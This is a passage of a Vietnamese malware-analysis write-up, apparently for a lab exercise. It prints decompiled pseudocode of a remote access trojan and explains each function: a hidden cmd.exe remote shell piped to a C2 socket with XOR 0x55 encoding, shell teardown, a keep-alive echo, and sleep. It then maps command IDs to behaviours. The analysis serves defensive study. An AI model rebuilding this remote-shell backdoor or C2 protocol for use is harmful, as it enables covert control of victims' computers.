+      lpBytesRead: &BytesRead,
+      lpTotalBytesAvail: nullptr,
+      lpBytesLeftThisMessage: nullptr);
+    if ( BytesRead == 0 )
+      break;
+    if ( !ReadFile(
+            hFile: hNamedPipe,
+            lpBuffer: Buffer,
+            nNumberOfBytesToRead: BytesRead,
+            lpNumberOfBytesRead: &BytesRead,
+            lpOverlapped: nullptr) )
+      break;
+    v1 = BytesRead;
+    Buffer[BytesRead] = 0;
+    BytesRead = v1 + 1;
+    for ( i = 0; i < 4096; ++i )
+      Buffer[i] ^= 0x55u;
+  }
+  while ( send(s, buf: Buffer, len: 4100, flags: 0) > 0 );
+  v10 = 0;
+  for ( j = 0; j < 4096; ++j )
+    Buffer[j] ^= 0x55u;
+  return send(s, buf: Buffer, len: 4100, flags: 0);
+}
+```
+Đây là hàm thực hiện cơ chế remote shell, nó tạo 1 tiến trình ngầm `cmd.exe`, kết nối với C2 thông qua pipe I/O.
+Vậy, `ID = 9` là lệnh khởi tạo remote shell.
+*Case 10*
+```c
+int __cdecl sub_402660(SOCKET s, const char *lpBuffer)
+{
+  int i; // eax
+  int result; // eax
+  DWORD v4; // eax
+  DWORD v5; // eax
+  int j; // eax
+  int k; // eax
+  int v8; // [esp+Ch] [ebp-100Ch]
+  char buf[2]; // [esp+12h] [ebp-1006h] BYREF
+  _DWORD Buffer[1025]; // [esp+14h] [ebp-1004h] BYREF
+
+  v8 = 0;
+  for ( i = 0; i < 256; ++i )
+    lpBuffer[i] ^= 0x55u;
+  BytesRead = strlen(lpBuffer);
+  result = WriteFile(
+             hFile: hFile,
+             lpBuffer,
+             nNumberOfBytesToWrite: BytesRead,
+             lpNumberOfBytesWritten: &BytesRead,
+             lpOverlapped: nullptr);
+  if ( result != 0 )
+  {
+    if ( BytesRead > 4 && *lpBuffer == 101 && lpBuffer[1] == 120 && lpBuffer[2] == 105 && lpBuffer[3] == 116 )
+    {
+      Buffer[1024] = 0;
+      return _mtinitlocks(s);
+    }
+    else
+    {
+      Buffer[1024] = 1;
+LABEL_11:
+      while ( 1 )
+      {
+        PeekNamedPipe(
+          hNamedPipe: hNamedPipe,
+          lpBuffer: Buffer,
+          nBufferSize: 0x200u,
+          lpBytesRead: &BytesRead,
+          lpTotalBytesAvail: nullptr,
+          lpBytesLeftThisMessage: nullptr);
+        if ( ++v8 == 20 )
+          break;
+        v4 = BytesRead;
+        if ( BytesRead != 0 )
+        {
+          v8 = 0;
+LABEL_15:
+          if ( ReadFile(
+                 hFile: hNamedPipe,
+                 lpBuffer: Buffer,
+                 nNumberOfBytesToRead: v4,
+                 lpNumberOfBytesRead: &BytesRead,
+                 lpOverlapped: nullptr) )
+          {
+            v5 = BytesRead;
+            *((_BYTE *)Buffer + BytesRead) = 0;
+            BytesRead = v5 + 1;
+            while ( 1 )
+            {
+              for ( j = 0; j < 4096; ++j )
+                *((_BYTE *)Buffer + j) ^= 0x55u;
+              if ( send(s, buf: (const char *)Buffer, len: 4100, flags: 0) <= 0 )
+                break;
+              recv(s, buf, len: 2, flags: 0);
+              if ( strcmp(buf, aO) == 0 )
+              {
+                memset(Buffer, 0, sizeof(Buffer));
+                Buffer[1024] = 1;
+                PeekNamedPipe(
+                  hNamedPipe: hNamedPipe,
+                  lpBuffer: Buffer,
+                  nBufferSize: 0x400u,
+                  lpBytesRead: &BytesRead,
+                  lpTotalBytesAvail: nullptr,
+                  lpBytesLeftThisMessage: nullptr);
+                v4 = BytesRead;
+                if ( BytesRead != 0 )
+                  goto LABEL_15;
+                goto LABEL_11;
+              }
+            }
+          }
+          break;
+        }
+        Sleep(dwMilliseconds: 0x64u);
+      }
+      Buffer[1024] = 0;
+      for ( k = 0; k < 4096; ++k )
+        *((_BYTE *)Buffer + k) ^= 0x55u;
+      return send(s, buf: (const char *)Buffer, len: 4100, flags: 0);
+    }
+  }
+  return result;
+}
+```
+Hàm này thực hiện ghi dữ liệu vào 1 pipe I/O của remote shell
+Vậy, `ID = 1` là lệnh thao tác với remote shell.
+*Case 11*
+```c
+int __cdecl _mtinitlocks(SOCKET s)
+{
+  CloseHandle(hObject: hNamedPipe);
+  CloseHandle(hObject: hWritePipe);
+  CloseHandle(hObject: dword_40AA8C);
+  CloseHandle(hObject: hFile);
+  return send(s, buf: buf, len: 2, flags: 0);
+}
+```
+Đây là hàm hủy remote shell.
+Vậy, `ID = 11` là lệnh hủy remote shell.
+*Case 12*
+```c
+int __cdecl sub_402880(SOCKET s)
+{
+  char buf; // [esp+4h] [ebp-8h] BYREF
+  int v3; // [esp+5h] [ebp-7h]
+  __int16 v4; // [esp+9h] [ebp-3h]
+  char v5; // [esp+Bh] [ebp-1h]
+
+  v3 = 0;
+  v4 = 0;
+  buf = 0;
+  v5 = 0;
+  recv(s, &buf, len: 7, flags: 0);
+  return send(s, &buf, len: 7, flags: 0);
+}
+```
+Đây là cơ chế echo của giao thức mạng do RATs sử dụng.Trong các phần mềm gián điệp, tính năng "gương phản chiếu" 7 bytes này thường phục vụ 3 mục đích:
+- **Keep-Alive (Chống rớt mạng / Bypass NAT Timeout):** Kết nối TCP nếu để im quá lâu không truyền dữ liệu sẽ bị tường lửa, Router hoặc bảng NAT ở giữa tự động ngắt (TCP Idle Timeout). Định kỳ C2 sẽ bắn một gói tin nhỏ 7 bytes để giữ kết nối luôn thông suốt.
+- **Heartbeat & Đo độ trễ (Ping / RTT Measurement):** C2 Server gửi một chuỗi 7 bytes (ví dụ: `"PING123"` hoặc timestamp rút gọn). Khi nhận lại đúng 7 bytes đó, C2 biết chắc chắn con bot vẫn còn sống (alive) và đo được độ trễ mạng (Ping) của máy nạn nhân.
+- **Handshake kiểm tra socket:** Trước khi C2 chuẩn bị chuyển sang một lệnh nặng (như truyền file lớn hoặc mở Shell), nó bắn 7 bytes để test xem socket có đang ở trạng thái sẵn sàng hay không.
+Vậy, `ID = 12` là lệnh echo.
+*Case 13*
+```c
+void __cdecl sub_4028C0(int a1, char *a2)
+{
+  Sleep(dwMilliseconds: *a2);
+}
+```
+Đây là lệnh ngủ.
+Vậy, `ID = 3` là lệnh ngủ.
+
+Vậy, các  ID thực hiện các hành vi mà đề bài chỉ ra đó là:
+- ==List processes:== `7`
+- ==interactive remote shell:== `9`, `10`, `11`
+- ==upload file:== '6'
+
+9. (Đã phân tích hết các hàm ở bên trên)
